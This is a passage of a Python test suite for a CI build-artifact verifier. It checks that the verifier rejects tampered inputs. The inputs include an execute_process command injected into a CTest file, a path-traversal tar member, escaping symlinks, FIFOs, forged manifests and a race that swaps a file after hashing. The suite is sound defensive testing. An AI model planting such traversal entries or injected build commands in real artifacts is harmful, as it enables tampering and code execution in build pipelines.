            # side-effect-capable command. The protected coverage verifier must
            # reject the exact archived bytes without invoking CTest/CMake or
            # producing the marker.
            side_effect_root = root / "side-effect-artifacts"
            marker = root / "candidate-control-side-effect"
            root_control = producer_root / "CTestTestfile.cmake"
            clean_control = root_control.read_bytes()
            root_control.write_bytes(
                clean_control
                + (
                    '\nexecute_process(COMMAND "/usr/bin/touch" '
                    f'"{marker}")\n'
                ).encode("utf-8")
            )
            for role in ("ctest-control", "ctest-runtime"):
                role_root = side_effect_root / role
                role_root.mkdir(parents=True)
                run_command(
                    sys.executable,
                    SCRIPTS / "reusable_build.py",
                    "--repo-root",
                    candidate,
                    "--inventory-dir",
                    inventory,
                    "create-targeted",
                    "--source",
                    producer_root,
                    "--role",
                    role,
                    "--archive",
                    role_root / f"{role}.tar.gz",
                    "--manifest",
                    role_root / f"{role}.manifest.json",
                    "--candidate-commit",
                    candidate_commit,
                    "--profile",
                    "default",
                    "--image-digest",
                    IMAGE_DIGEST,
                    "--workflow-commit",
                    COMMIT_A,
                )
            root_control.write_bytes(clean_control)
            raw_inventory_path.unlink()
            shutil.rmtree(producer_root)
            self.assertEqual(list(producer_root.parent.iterdir()), [])

            def create_control_case(
                label: str, payload: dict[str, object]
            ) -> tuple[Path, Path, str]:
                """Create one self-consistent raw/control pair via production code."""
                raw = root / f"raw-{label}"
                control = root / f"control-{label}"
                emitted_path = root / f"github-output-{label}.txt"
                emitted_path.write_text("", encoding="utf-8")
                observed_matrix = BuildSmokeRoutingContractTest._write_raw_route_bundle(
                    raw,
                    (
                        json.dumps(payload, sort_keys=True, separators=(",", ":"))
                        + "\n"
                    ).encode("utf-8"),
                    candidate_commit=candidate_commit,
                    fallback_matrix_digest=matrix_digest,
                )
                self.assertEqual(observed_matrix, matrix_digest)
                BuildSmokeRoutingContractTest._run_protected_control(
                    candidate,
                    candidate_commit,
                    raw,
                    control,
                    emitted_path,
                    expect_success=True,
                )
                outputs = dict(
                    line.split("=", 1)
                    for line in emitted_path.read_text(encoding="utf-8").splitlines()
                )
                return raw, control, outputs["route_sha256"]

            def coverage_command(
                raw: Path,
                control: Path,
                route_digest: str,
                *,
                expect_success: bool,
            ) -> subprocess.CompletedProcess[str]:
                """Run the production dual-root and cross-inventory verifier."""
                return run_command(
                    sys.executable,
                    SCRIPTS / "reusable_build.py",
                    "--repo-root",
                    REPO_ROOT,
                    "verify-ordinary-coverage",
                    "--candidate-root",
                    candidate,
                    "--raw-dir",
                    raw,
                    "--control-manifest",
                    control / "build-smoke-control.manifest.json",
                    "--route-sha256",
                    route_digest,
                    "--artifact-root",
                    artifact_root,
                    "--candidate-commit",
                    candidate_commit,
                    "--profile",
                    "default",
                    "--matrix-sha256",
                    matrix_digest,
                    "--image-digest",
                    IMAGE_DIGEST,
                    "--workflow-commit",
                    COMMIT_A,
                    expect_success=expect_success,
                )

            raw, control, route_digest = create_control_case("baseline", raw_payload)
            passed = coverage_command(
                raw, control, route_digest, expect_success=True
            )
            self.assertIn("coverage cross-binding passed", passed.stdout)

            side_effect_failed = run_command(
                sys.executable,
                SCRIPTS / "reusable_build.py",
                "--repo-root",
                REPO_ROOT,
                "verify-ordinary-coverage",
                "--candidate-root",
                candidate,
                "--raw-dir",
                raw,
                "--control-manifest",
                control / "build-smoke-control.manifest.json",
                "--route-sha256",
                route_digest,
                "--artifact-root",
                side_effect_root,
                "--candidate-commit",
                candidate_commit,
                "--profile",
                "default",
                "--matrix-sha256",
                matrix_digest,
                "--image-digest",
                IMAGE_DIGEST,
                "--workflow-commit",
                COMMIT_A,
                expect_success=False,
            )
            self.assertIn("side-effect-capable", side_effect_failed.stderr)
            self.assertFalse(marker.exists())

            ordinary = next(
                item for item in raw_payload["tests"] if item["name"] == "test_contract"
            )
            mutations: dict[str, dict[str, object]] = {}
            removed = json.loads(json.dumps(raw_payload))
            removed["tests"] = [
                item for item in removed["tests"] if item["name"] != "test_contract"
            ]
            mutations["ordinary-removed"] = removed
            added = json.loads(json.dumps(raw_payload))
            added["tests"].append(
                {
                    "backtrace": 1,
                    "command": ["/usr/bin/true"],
                    "name": "test_contract_second",
                    "properties": [],
                }
            )
            mutations["ordinary-added"] = added
            relabelled = json.loads(json.dumps(raw_payload))
            relabelled_ordinary = next(
                item
                for item in relabelled["tests"]
                if item["name"] == ordinary["name"]
            )
            relabelled_ordinary["properties"] = [
                {"name": "LABELS", "value": ["build-smoke"]}
            ]
            mutations["ordinary-relabelled"] = relabelled
            label_changed = json.loads(json.dumps(raw_payload))
            label_changed_ordinary = next(
                item
                for item in label_changed["tests"]
                if item["name"] == ordinary["name"]
            )
            label_changed_ordinary["properties"] = [
                property_value
                for property_value in label_changed_ordinary.get("properties", [])
                if property_value.get("name") != "LABELS"
            ] + [{"name": "LABELS", "value": ["ordinary-regression"]}]
            mutations["ordinary-label-changed"] = label_changed
            for label, payload in mutations.items():
                with self.subTest(coverage_drift=label):
                    drift_raw, drift_control, drift_route = create_control_case(
                        label, payload
                    )
                    failed = coverage_command(
                        drift_raw,
                        drift_control,
                        drift_route,
                        expect_success=False,
                    )
                    self.assertRegex(
                        failed.stderr,
                        r"(?:CTest records differ|ordinary CTest inventory is invalid)",
                    )

            forged_raw = root / "raw-forged-identity"
            forged_control = root / "control-forged-identity"
            shutil.copytree(raw, forged_raw)
            shutil.copytree(control, forged_control)
            forged_manifest_path = forged_raw / "raw-inventory.manifest.json"
            forged_manifest = json.loads(
                forged_manifest_path.read_text(encoding="utf-8")
            )
            forged_manifest["candidate_commit"] = COMMIT_A
            forged_manifest_path.write_text(
                json.dumps(
                    forged_manifest,
                    sort_keys=True,
                    separators=(",", ":"),
                    ensure_ascii=True,
                )
                + "\n",
                encoding="utf-8",
            )
            identity_failed = coverage_command(
                forged_raw,
                forged_control,
                route_digest,
                expect_success=False,
            )
            self.assertIn("raw routing candidate_commit differs", identity_failed.stderr)

            digest_control = root / "control-forged-ctest-digest"
            shutil.copytree(control, digest_control)
            digest_manifest_path = (
                digest_control / "build-smoke-control.manifest.json"
            )
            digest_manifest = json.loads(
                digest_manifest_path.read_text(encoding="utf-8")
            )
            digest_manifest["ctest_inventory_sha256"] = "f" * 64
            digest_manifest_bytes = (
                json.dumps(
                    digest_manifest,
                    sort_keys=True,
                    separators=(",", ":"),
                    ensure_ascii=True,
                )
                + "\n"
            ).encode("utf-8")
            digest_manifest_path.write_bytes(digest_manifest_bytes)
            digest_failed = coverage_command(
                raw,
                digest_control,
                hashlib.sha256(digest_manifest_bytes).hexdigest(),
                expect_success=False,
            )
            self.assertIn(
                "ctest_inventory_sha256 differs", digest_failed.stderr
            )

            aliased_raw = root / "raw-alias"
            aliased_raw.symlink_to(raw, target_is_directory=True)
            alias_failed = coverage_command(
                aliased_raw, control, route_digest, expect_success=False
            )
            self.assertIn("real directory", alias_failed.stderr)

            candidate_alias = root / "candidate-alias"
            candidate_alias.symlink_to(candidate, target_is_directory=True)
            linked_candidate = run_command(
                sys.executable,
                SCRIPTS / "reusable_build.py",
                "--repo-root",
                REPO_ROOT,
                "verify-ordinary-coverage",
                "--candidate-root",
                candidate_alias,
                "--raw-dir",
                raw,
                "--control-manifest",
                control / "build-smoke-control.manifest.json",
                "--route-sha256",
                route_digest,
                "--artifact-root",
                artifact_root,
                "--candidate-commit",
                candidate_commit,
                "--profile",
                "default",
                "--matrix-sha256",
                matrix_digest,
                "--image-digest",
                IMAGE_DIGEST,
                "--workflow-commit",
                COMMIT_A,
                expect_success=False,
            )
            self.assertIn("real non-link directory", linked_candidate.stderr)

    def test_ctest_record_normalization_uses_only_path_components(self) -> None:
        """Normalize structured roots and reject textual-prefix ambiguity.

        Returns:
            None after exact roots, descendants, overlapping source/build roots,
            and explicit path-list fields normalize deterministically while
            sibling prefixes, embedded prose, quoted paths, and inverted root
            topology fail closed.

        Raises:
            AssertionError: The production pure-data record normalizer performs
                an unrestricted string replacement or accepts an ambiguous
                root-bearing scalar.
        """
        closure = self._load_ctest_closure_module()
        source_root = Path("/opt/photospider-source")
        build_root = source_root / "out/build"

        def payload(command: list[str], environment: list[str] | None = None) -> bytes:
            """Return one canonical raw CTest record for the requested fields."""
            properties: list[dict[str, object]] = [
                {"name": "WORKING_DIRECTORY", "value": str(build_root)}
            ]
            if environment is not None:
                properties.append({"name": "ENVIRONMENT", "value": environment})
            return (
                json.dumps(
                    {
                        "kind": "ctestInfo",
                        "tests": [
                            {
                                "command": command,
                                "name": "component_contract",
                                "properties": properties,
                            }
                        ],
                        "version": {"major": 1, "minor": 0},
                    },
                    sort_keys=True,
                    separators=(",", ":"),
                )
                + "\n"
            ).encode("utf-8")

        record = closure.complete_test_records(
            payload(
                [
                    str(build_root / "bin/test"),
                    str(source_root),
                    str(source_root / "tests/data.bin"),
                    str(build_root),
                    str(build_root / "generated/data.bin"),
                ],
                [
                    "PHOTOSPIDER_PATH="
                    f"{source_root / 'assets'}{os.pathsep}{build_root / 'plugins'}"
                ],
            ),
            "component normalization fixture",
            source_root,
            build_root,
        )[0]
        self.assertEqual(
            record["command"],
            [
                "${BUILD_ROOT}/bin/test",
                "${SOURCE_ROOT}",
                "${SOURCE_ROOT}/tests/data.bin",
                "${BUILD_ROOT}",
                "${BUILD_ROOT}/generated/data.bin",
            ],
        )
        self.assertEqual(
            record["properties"]["ENVIRONMENT"],
            ["PHOTOSPIDER_PATH=${SOURCE_ROOT}/assets"
             f"{os.pathsep}${{BUILD_ROOT}}/plugins"],
        )

        ambiguous_commands = {
            "root-sibling": [str(build_root / "bin/test"), f"{source_root}-copy/data"],
            "embedded-text": [
                str(build_root / "bin/test"),
                f"prefix:{source_root}/data",
            ],
            "quoted-path": [
                str(build_root / "bin/test"),
                f'--repo="{source_root}"',
            ],
            "list-sibling": [str(build_root / "bin/test")],
        }
        for label, command in ambiguous_commands.items():
            with self.subTest(ambiguous=label):
                environment = (
                    [f"PHOTOSPIDER_PATH={source_root}/ok{os.pathsep}{source_root}-copy/bad"]
                    if label == "list-sibling"
                    else None
                )
                with self.assertRaisesRegex(
                    closure.CTestClosureError,
                    r"(?:ambiguous|prefix sibling|embedded)",
                ):
                    closure.complete_test_records(
                        payload(command, environment),
                        f"{label} fixture",
                        source_root,
                        build_root,
                    )

        with self.assertRaisesRegex(
            closure.CTestClosureError, "root topology is ambiguous"
        ):
            closure.complete_test_records(
                payload([str(build_root / "bin/test")]),
                "inverted root fixture",
                build_root,
                source_root,
            )

    def test_targeted_content_sizes_reject_bool_string_negative_and_total_drift(self) -> None:
        """Reject non-integer and inconsistent member or aggregate byte counts."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            installed = self._prepare_installed_prefix(root)
            archive, manifest, identity = self._create_targeted(
                root, "installed-package", installed
            )
            cases = (
                ("member-bool", ("member", True), "member size is invalid"),
                ("member-string", ("member", "1"), "member size is invalid"),
                ("member-negative", ("member", -1), "member size is invalid"),
                (
                    "aggregate-bool",
                    ("aggregate", True),
                    "uncompressed size is invalid",
                ),
                (
                    "aggregate-string",
                    ("aggregate", "1"),
                    "uncompressed size is invalid",
                ),
                (
                    "aggregate-negative",
                    ("aggregate", -1),
                    "uncompressed size is invalid",
                ),
                (
                    "aggregate-total-drift",
                    (
                        "aggregate",
                        identity["content"]["uncompressed_size"] + 1,
                    ),
                    "uncompressed size mismatch",
                ),
            )
            for label, (field, replacement), diagnostic in cases:
                with self.subTest(case=label):
                    mutated = json.loads(json.dumps(identity))
                    if field == "member":
                        mutated["content"]["members"][0]["size"] = replacement
                    else:
                        mutated["content"]["uncompressed_size"] = replacement
                    manifest.write_text(
                        json.dumps(
                            mutated,
                            sort_keys=True,
                            separators=(",", ":"),
                            ensure_ascii=True,
                        )
                        + "\n",
                        encoding="utf-8",
                    )
                    failed = run_command(
                        sys.executable,
                        SCRIPTS / "reusable_build.py",
                        "verify-targeted-only",
                        "--archive",
                        archive,
                        "--manifest",
                        manifest,
                        "--role",
                        "installed-package",
                        "--candidate-commit",
                        COMMIT_A,
                        "--profile",
                        "default",
                        "--matrix-sha256",
                        identity["matrix_sha256"],
                        "--image-digest",
                        IMAGE_DIGEST,
                        "--workflow-commit",
                        COMMIT_B,
                        expect_success=False,
                    )
                    self.assertIn(diagnostic, failed.stderr)

    def test_restored_package_tree_rejects_add_delete_rewrite_and_mode_drift(self) -> None:
        """Remeasure every package member and executable bit before and after use."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            installed = self._prepare_installed_prefix(root)
            archive, manifest, identity = self._create_targeted(
                root, "installed-package", installed
            )
            destination = root / "restored-package"
            extract_arguments: tuple[object, ...] = (
                sys.executable,
                SCRIPTS / "reusable_build.py",
                "verify-targeted-extract",
                "--archive",
                archive,
                "--manifest",
                manifest,
                "--role",
                "installed-package",
                "--candidate-commit",
                COMMIT_A,
                "--profile",
                "default",
                "--matrix-sha256",
                identity["matrix_sha256"],
                "--image-digest",
                IMAGE_DIGEST,
                "--workflow-commit",
                COMMIT_B,
                "--destination",
                destination,
            )
            verify_arguments: tuple[object, ...] = (
                sys.executable,
                SCRIPTS / "reusable_build.py",
                "verify-targeted-tree",
                "--manifest",
                manifest,
                "--role",
                "installed-package",
                "--content-root",
                destination / "ci",
            )
            run_command(*extract_arguments)
            evidence = root / "tree-verification.json"
            run_command(*verify_arguments, "--evidence-output", evidence)
            self.assertTrue(evidence.is_file())
            verified = json.loads(evidence.read_text(encoding="utf-8"))
            retained_arguments: tuple[object, ...] = (
                "--expected-content-sha256",
                verified["content_sha256"],
                "--expected-manifest-sha256",
                verified["manifest_sha256"],
            )

            original_manifest = manifest.read_bytes()
            forged_manifest = json.loads(original_manifest)
            forged_manifest["producer_workflow_commit"] = COMMIT_A
            manifest.write_text(
                json.dumps(
                    forged_manifest,
                    sort_keys=True,
                    separators=(",", ":"),
                    ensure_ascii=True,
                )
                + "\n",
                encoding="utf-8",
            )
            forged = run_command(
                *verify_arguments,
                *retained_arguments,
                expect_success=False,
            )
            self.assertIn("retained manifest identity", forged.stderr)
            manifest.write_bytes(original_manifest)

            mutations = ("addition", "deletion", "rewrite", "executable-bit")
            for mutation in mutations:
                with self.subTest(mutation=mutation):
                    run_command(*extract_arguments)
                    content_root = destination / "ci"
                    header = content_root / "installed/include/photospider/product.hpp"
                    if mutation == "addition":
                        (content_root / "installed/unexpected-member.txt").write_text(
                            "unexpected\n", encoding="utf-8"
                        )
                    elif mutation == "deletion":
                        header.unlink()
                    elif mutation == "rewrite":
                        original_size = header.stat().st_size
                        header.write_bytes(b"x" * original_size)
                    else:
                        header.chmod(header.stat().st_mode | 0o111)
                    failed = run_command(
                        *verify_arguments,
                        *retained_arguments,
                        expect_success=False,
                    )
                    self.assertIn(
                        "content tree differs from its verified manifest",
                        failed.stderr,
                    )

    def test_atomic_manifest_replacement_fails_one_retained_tree_snapshot(self) -> None:
        """Reject pathname replacement after hashing retained manifest bytes."""
        module = self._load_reusable_module()
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            installed = self._prepare_installed_prefix(root)
            archive, manifest, identity = self._create_targeted(
                root, "installed-package", installed
            )
            destination = root / "restored-package"
            run_command(
                sys.executable,
                SCRIPTS / "reusable_build.py",
                "verify-targeted-extract",
                "--archive",
                archive,
                "--manifest",
                manifest,
                "--role",
                "installed-package",
                "--candidate-commit",
                COMMIT_A,
                "--profile",
                "default",
                "--matrix-sha256",
                identity["matrix_sha256"],
                "--image-digest",
                IMAGE_DIGEST,
                "--workflow-commit",
                COMMIT_B,
                "--destination",
                destination,
            )
            forged_identity = json.loads(json.dumps(identity))
            forged_identity["producer_workflow_commit"] = COMMIT_A
            self.assertEqual(forged_identity["content"], identity["content"])
            replacement = root / "replacement.manifest.json"
            replacement.write_text(
                json.dumps(
                    forged_identity,
                    sort_keys=True,
                    separators=(",", ":"),
                    ensure_ascii=True,
                )
                + "\n",
                encoding="utf-8",
            )
            arguments = SimpleNamespace(
                content_root=destination / "ci",
                evidence_output=root / "must-not-exist.json",
                expected_content_sha256=None,
                expected_manifest_sha256=None,
                manifest=manifest,
                role="installed-package",
            )
            original_sha256 = module._ManifestSnapshot.sha256
            replaced = False

            def replace_after_digest(snapshot: object) -> str:
                """Replace only the pathname after hashing the retained bytes."""
                nonlocal replaced
                digest = original_sha256(snapshot)
                replacement.replace(manifest)
                replaced = True
                return digest

            with mock.patch.object(
                module._ManifestSnapshot, "sha256", replace_after_digest
            ):
                with self.assertRaisesRegex(
                    module.ReusableBuildError,
                    "targeted manifest pathname changed during verification",
                ):
                    module._verify_targeted_tree(arguments)
            self.assertTrue(replaced)
            self.assertFalse(arguments.evidence_output.exists())

    def test_atomic_manifest_replacement_blocks_targeted_archive_verification(self) -> None:
        """Reject a replaced manifest pathname in verify-only/extract shared code."""
        module = self._load_reusable_module()
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            installed = self._prepare_installed_prefix(root)
            archive, manifest, identity = self._create_targeted(
                root, "installed-package", installed
            )
            forged_identity = json.loads(json.dumps(identity))
            forged_identity["profile"] = "forged-profile"
            self.assertEqual(forged_identity["content"], identity["content"])
            replacement = root / "replacement.manifest.json"
            replacement.write_text(
                json.dumps(
                    forged_identity,
                    sort_keys=True,
                    separators=(",", ":"),
                    ensure_ascii=True,
                )
                + "\n",
                encoding="utf-8",
            )
            arguments = SimpleNamespace(
                archive=archive,
                candidate_commit=COMMIT_A,
                expected_manifest_sha256=None,
                image_digest=IMAGE_DIGEST,
                manifest=manifest,
                matrix_sha256=identity["matrix_sha256"],
                profile="default",
                repo_root=REPO_ROOT,
                role="installed-package",
                workflow_commit=COMMIT_B,
            )
            original_sha256 = module._ManifestSnapshot.sha256

            def replace_after_digest(snapshot: object) -> str:
                """Replace the pathname after the retained object is hashed."""
                digest = original_sha256(snapshot)
                replacement.replace(manifest)
                return digest

            with mock.patch.object(
                module._ManifestSnapshot, "sha256", replace_after_digest
            ):
                with self.assertRaisesRegex(
                    module.ReusableBuildError,
                    "targeted manifest pathname changed during verification",
                ):
                    module._verify_targeted_only(arguments)

    def test_runtime_closure_rejects_missing_relative_inputs_library_and_trust(self) -> None:
        """Reject each relative CTest input plus absolute runtime/trust classes."""
        closure = self._load_ctest_closure_module()
        removals = {
            "nonstandard include": "contract-discovery.cmake",
            "relative executable": "tests/test_contract",
            "relative command data": "tests/relative-command-data.bin",
            "relative required file": "tests/relative-required-data.bin",
            "relative environment file": "tests/relative-environment-data.bin",
            "relative environment path file": (
                "tests/relative-environment-path/path-entry.bin"
            ),
            "dynamic library": "lib/libphotospider_runtime.so",
            "trust material": "generated/plugin_trust/manifest.txt",
        }
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            for label, relative in removals.items():
                with self.subTest(dependency=label):
                    build = root / re.sub(r"[^a-z]+", "-", label) / "ci"
                    self._prepare_build(build)
                    (build / relative).unlink()
                    with self.assertRaises(closure.CTestClosureError):
                        closure.verify_restored_runtime(REPO_ROOT, build, "ctest")

    def test_runtime_closure_accepts_real_root_locator_command_shapes(self) -> None:
        """Ignore exact source/build roots emitted by real CTest JSON discovery."""
        closure = self._load_ctest_closure_module()
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            source = root / "source"
            build = root / "build"
            source.mkdir()
            driver = source / "driver.py"
            driver.write_text("raise SystemExit(0)\n", encoding="utf-8")
            (source / "unreferenced-source.txt").write_text(
                "must not enter the closure\n", encoding="utf-8"
            )
            python = Path(sys.executable).as_posix()
            (source / "CMakeLists.txt").write_text(
                "cmake_minimum_required(VERSION 3.16)\n"
                "project(ctest_root_locator_contract NONE)\n"
                "enable_testing()\n"
                "add_test(NAME InstallConsumerArchitecturePropagationSafety\n"
                f'  COMMAND "{python}" -B "${{CMAKE_SOURCE_DIR}}/driver.py"\n'
                "    --build-dir \"${CMAKE_BINARY_DIR}\"\n"
                "    --cmake-executable \"${CMAKE_COMMAND}\"\n"
                "    --ctest-executable \"${CMAKE_CTEST_COMMAND}\"\n"
                "    --config Release\n"
                f'    --python-executable "{python}")\n'
                "add_test(NAME GraphCliOptionBadAlloc\n"
                f'  COMMAND "{python}" "${{CMAKE_SOURCE_DIR}}/driver.py"\n'
                "    --repo \"${CMAKE_SOURCE_DIR}\"\n"
                "    --binary \"${CMAKE_BINARY_DIR}/bin/graph_cli\"\n"
                "    --out \"${CMAKE_BINARY_DIR}/tests/graph_cli_option_bad_alloc\")\n",
                encoding="utf-8",
            )
            run_command("cmake", "-S", source, "-B", build)
            executable = build / "bin/graph_cli"
            executable.parent.mkdir(parents=True, exist_ok=True)
            executable.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
            executable.chmod(0o755)
            (build / "objects").mkdir()
            (build / "objects/unrelated.o").write_bytes(b"producer object")
            (build / "unreferenced-root.txt").write_text(
                "must not enter the closure\n", encoding="utf-8"
            )
            inventory = root / "ctest-inventory.json"
            discovered = run_command(
                "ctest",
                "--test-dir",
                build,
                "--show-only=json-v1",
                "-C",
                "Release",
            )
            inventory.write_text(discovered.stdout, encoding="utf-8")
            payload = json.loads(discovered.stdout)
            commands = {test["name"]: test["command"] for test in payload["tests"]}
            graph_command = commands["GraphCliOptionBadAlloc"]
            install_command = commands["InstallConsumerArchitecturePropagationSafety"]
            self.assertEqual(
                Path(graph_command[graph_command.index("--repo") + 1]).resolve(),
                source.resolve(),
            )
            self.assertEqual(
                Path(
                    install_command[install_command.index("--build-dir") + 1]
                ).resolve(),
                build.resolve(),
            )

            value = closure.create_closure(
                source, build, inventory, "Release", require_runtime=True
            )
            self.assertIn("bin/graph_cli", value["runtime_paths"])
            self.assertNotIn("objects/unrelated.o", value["runtime_paths"])
            self.assertNotIn("unreferenced-root.txt", value["runtime_paths"])
            source_paths = [item["path"] for item in value["source_inputs"]]
            self.assertEqual(source_paths, ["driver.py"])
            self.assertNotIn("unreferenced-source.txt", source_paths)

    def test_ctest_control_graph_rejects_a_two_file_cycle(self) -> None:
        """Reject a generated CTest include back edge with a live DFS stack."""
        closure = self._load_ctest_closure_module()
        with tempfile.TemporaryDirectory() as temporary_text:
            build = Path(temporary_text)
            child = build / "child/CTestTestfile.cmake"
            child.parent.mkdir()
            (build / "CTestTestfile.cmake").write_text(
                'include("child/CTestTestfile.cmake")\n', encoding="utf-8"
            )
            child.write_text(
                'include("../CTestTestfile.cmake")\n', encoding="utf-8"
            )
            with self.assertRaisesRegex(
                closure.CTestClosureError, "generated CTest include cycle"
            ):
                closure._control_paths(build)

    def test_runtime_closure_rejects_an_escaping_library_alias(self) -> None:
        """Materialize only in-root DSO aliases and reject an escaping target."""
        closure = self._load_ctest_closure_module()
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            build = root / "ci"
            self._prepare_build(build, runtime_alias=True)
            alias = build / "lib/libphotospider_runtime.so.0"
            alias.unlink()
            outside = root / "outside-runtime.so.0"
            outside.write_bytes(b"outside")
            alias.symlink_to(outside)
            with self.assertRaises(closure.CTestClosureError):
                closure.verify_restored_runtime(REPO_ROOT, build, "ctest")

    def test_installed_package_rejects_a_nonlibrary_link(self) -> None:
        """Materialize only DSO aliases and reject linked package headers."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            build = root / "targeted-root/ci"
            inventory = self._prepare_build(build, runtime_alias=True)
            installed = root / "installed-prefix"
            header_root = installed / "include/photospider"
            header_root.mkdir(parents=True)
            real_header = header_root / "product.hpp"
            real_header.write_text("#pragma once\n", encoding="utf-8")
            (header_root / "alias.hpp").symlink_to(real_header.name)
            (installed / "lib/cmake/Photospider").mkdir(parents=True)
            (installed / "lib/cmake/Photospider/PhotospiderConfig.cmake").write_text(
                "set(Photospider_FOUND TRUE)\n", encoding="utf-8"
            )
            (installed / "lib/libphotospider.a").write_bytes(b"product")
            failed = run_command(
                sys.executable,
                SCRIPTS / "reusable_build.py",
                "--inventory-dir",
                inventory,
                "create-targeted",
                "--source",
                build,
                "--payload-source",
                installed,
                "--role",
                "installed-package",
                "--archive",
                root / "installed-package.tar.gz",
                "--manifest",
                root / "installed-package.manifest.json",
                "--candidate-commit",
                COMMIT_A,
                "--profile",
                "default",
                "--image-digest",
                IMAGE_DIGEST,
                "--workflow-commit",
                COMMIT_B,
                expect_success=False,
            )
            self.assertIn("non-library link", failed.stderr)

    def test_traversal_member_is_rejected_after_digest_match(self) -> None:
        """Reject a traversal entry even when a caller recomputes the archive hash."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            archive, manifest, identity = self._create(root, "unsafe")
            with archive.open("wb") as raw:
                with gzip.GzipFile(filename="", mode="wb", fileobj=raw, mtime=0) as compressed:
                    with tarfile.open(fileobj=compressed, mode="w") as tar:
                        information = tarfile.TarInfo("ci/../escape")
                        information.size = 1
                        tar.addfile(information, io.BytesIO(b"x"))
            identity["artifact"]["sha256"] = hashlib.sha256(archive.read_bytes()).hexdigest()
            identity["artifact"]["size"] = archive.stat().st_size
            manifest.write_text(
                json.dumps(identity, sort_keys=True, separators=(",", ":"), ensure_ascii=True) + "\n",
                encoding="utf-8",
            )
            failed = run_command(
                sys.executable, SCRIPTS / "reusable_build.py", "verify-only",
                "--archive", archive,
                "--manifest", manifest,
                "--candidate-commit", COMMIT_A,
                "--profile", "default",
                "--matrix-sha256", identity["matrix_sha256"],
                "--image-digest", IMAGE_DIGEST,
                "--workflow-commit", COMMIT_B,
                expect_success=False,
            )
            self.assertIn("unsafe archive member path", failed.stderr)

    def test_atomic_archive_replacement_cannot_change_verified_extraction(self) -> None:
        """Keep measurement and extraction on the object opened before replacement."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            archive, manifest, identity = self._create(root, "accepted")
            (root / "source/replacement-marker.txt").write_text(
                "replacement archive\n", encoding="utf-8"
            )
            replacement, _, _ = self._create(root, "replacement")
            destination = root / "restored"
            arguments = SimpleNamespace(
                archive=archive,
                candidate_commit=COMMIT_A,
                destination=destination,
                image_digest=IMAGE_DIGEST,
                manifest=manifest,
                matrix_sha256=identity["matrix_sha256"],
                profile="default",
                repo_root=REPO_ROOT,
                workflow_commit=COMMIT_B,
            )
            module = self._load_reusable_module()
            original_sha256 = module._ArchiveSnapshot.sha256
            replaced = False

            def replace_after_digest(snapshot: object) -> str:
                """Atomically replace the pathname after hashing the open object."""
                nonlocal replaced
                digest = original_sha256(snapshot)
                replacement.replace(archive)
                replaced = True
                return digest

            with mock.patch.object(
                module._ArchiveSnapshot, "sha256", replace_after_digest
            ):
                module._verify_extract(arguments)

            self.assertTrue(replaced)
            self.assertFalse((destination / "ci/replacement-marker.txt").exists())
            with tarfile.open(archive, mode="r:gz") as replacement_archive:
                self.assertIn(
                    "ci/replacement-marker.txt",
                    [member.name for member in replacement_archive.getmembers()],
                )

    def test_archive_snapshot_rejects_links_and_special_files(self) -> None:
        """Reject alias and FIFO archive objects without blocking on the FIFO."""
        module = self._load_reusable_module()
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            regular = root / "regular.tar.gz"
            regular.write_bytes(b"not needed for open-boundary validation")
            link = root / "archive-link.tar.gz"
            link.symlink_to(regular)
            with self.assertRaises((OSError, module.ReusableBuildError)):
                module._ArchiveSnapshot(link)

            fifo = root / "archive-fifo.tar.gz"
            os.mkfifo(fifo)
            with self.assertRaises(module.ReusableBuildError):
                module._ArchiveSnapshot(fifo)

    def test_manifest_snapshot_rejects_links_and_special_files(self) -> None:
        """Reject final-component aliases and FIFOs before manifest decoding."""
        module = self._load_reusable_module()
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            regular = root / "regular.manifest.json"
            regular.write_text("{}\n", encoding="utf-8")
            link = root / "manifest-link.json"
            link.symlink_to(regular)
            with self.assertRaises((OSError, module.ReusableBuildError)):
                module._ManifestSnapshot(link)

            fifo = root / "manifest-fifo.json"
            os.mkfifo(fifo)
            with self.assertRaises(module.ReusableBuildError):
                module._ManifestSnapshot(fifo)

    def test_consumer_verifies_two_attestations_before_extraction(self) -> None:
        """Require archive and manifest attestation calls on the generic consumer."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            source = root / "source"
            self._prepare_build(source)
            (source / "result.txt").write_text("verified\n", encoding="utf-8")
            reusable = root / "reusable"
            reusable.mkdir()
            archive = reusable / "ci-build.tar.gz"
            manifest = reusable / "ci-build.manifest.json"
            run_command(
                sys.executable, SCRIPTS / "reusable_build.py",
                "--inventory-dir", source / "generated/ci_inventory",
                "create",
                "--source", source,
                "--archive", archive,
                "--manifest", manifest,
                "--candidate-commit", COMMIT_A,
                "--profile", "default",
                "--image-digest", IMAGE_DIGEST,
                "--workflow-commit", COMMIT_B,
            )
            identity = json.loads(manifest.read_text(encoding="utf-8"))
            binary_dir = root / "bin"
            binary_dir.mkdir()
            gh_log = root / "gh.log"
            gh = binary_dir / "gh"
            gh.write_text(
                "#!/usr/bin/env bash\n"
                "set -Eeuo pipefail\n"
                "printf '%q ' \"$@\" >> \"$CI_TEST_GH_LOG\"; printf '\\n' >> \"$CI_TEST_GH_LOG\"\n"
                "printf '[]\\n'\n",
                encoding="utf-8",
            )
            gh.chmod(0o755)
            destination = root / "destination"
            run_command(
                "bash", SCRIPTS / "reusable_build_consume.sh",
                environment={
                    "PATH": f"{binary_dir}:{os.environ['PATH']}",
                    "CI_BUILD_PROFILE": "default",
                    "CI_CANDIDATE_COMMIT": COMMIT_A,
                    "CI_IMAGE_DIGEST": IMAGE_DIGEST,
                    "CI_MATRIX_SHA256": str(identity["matrix_sha256"]),
                    "CI_REUSABLE_DESTINATION": str(destination),
                    "CI_REUSABLE_DIR": str(reusable),
                    "CI_TEST_GH_LOG": str(gh_log),
